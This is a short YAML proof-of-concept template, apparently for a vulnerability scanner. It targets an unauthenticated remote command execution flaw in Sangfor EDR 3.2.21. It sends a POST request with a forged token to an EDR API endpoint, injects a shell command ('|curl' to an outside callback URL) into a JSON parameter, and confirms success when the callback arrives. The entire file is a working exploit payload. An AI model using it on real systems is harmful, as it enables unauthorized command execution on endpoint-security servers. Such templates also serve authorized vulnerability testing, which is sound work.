name: poc-yaml-sangfor-edr-unauthorized-rce
set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  - method: POST
    path: /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: >-
      {"params":"w=123\"'1234123'\"|curl {{reverseURL}}"}
    expression: >
      response.status == 200 && reverse.wait(5)
detail:
  author: x1n9Qi8
  Affected Version: "Sangfor EDR 3.2.21"
  links:
    - https://www.cnblogs.com/0day-li/p/13650452.html